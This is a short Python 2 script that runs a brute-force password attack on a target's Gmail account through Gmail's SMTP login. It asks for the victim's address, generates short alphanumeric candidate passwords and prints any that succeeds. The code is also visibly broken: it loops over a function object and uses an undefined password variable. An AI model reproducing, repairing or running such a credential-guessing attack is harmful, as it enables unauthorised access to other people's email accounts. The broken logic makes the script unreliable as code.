import itertools 
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter Target's Gmail Address: ")
def print_perms(chars, minlen, maxlen): 
    for n in range(minlen, maxlen+1): 
        for perm in itertools.product(chars, repeat=n): 
            print(''.join(perm)) 

print_perms("abcdefghijklmnopqrstuvwxyz1234567890", 2, 4)

for symbols in print_perms:
    try:
        smtpserver.login(user, password)

        print "[+] PASSWORD: %s" % symbols
        break;
    except smtplib.SMTPAuthenticationError:
        print "[!] ACCCESS DENIED: %s" % symbols
